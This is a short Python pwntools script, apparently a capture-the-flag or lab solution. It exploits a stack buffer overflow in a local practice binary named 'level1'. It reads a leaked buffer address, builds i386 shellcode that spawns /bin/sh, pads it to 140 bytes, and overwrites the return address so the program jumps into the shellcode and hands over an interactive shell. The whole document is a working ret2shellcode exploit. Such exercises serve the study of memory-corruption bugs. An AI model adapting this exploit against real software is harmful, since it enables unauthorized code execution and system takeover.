from pwn import *


def ret2_shellcode2(file_name='/mnt/hgfs/CyberSecurity/PWN/test/pwn1/level1'):
    print('call ret2shellcode2 start\n\n')

    elf = ELF(file_name)
    io = process([file_name])

    buf_ptr = p32(int(io.recvline().decode().split(':')[1][:0xA], 16))

    # 指定目标环境
    context(log_level='debug', arch='i386', os='linux')
    # context(log_level='debug', arch='amd64', os='linux')
    system_shellcode = asm(shellcraft.sh())

    payload = system_shellcode + b'A' * (140 - len(system_shellcode))

    payload += buf_ptr

    io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    ret2_shellcode2()
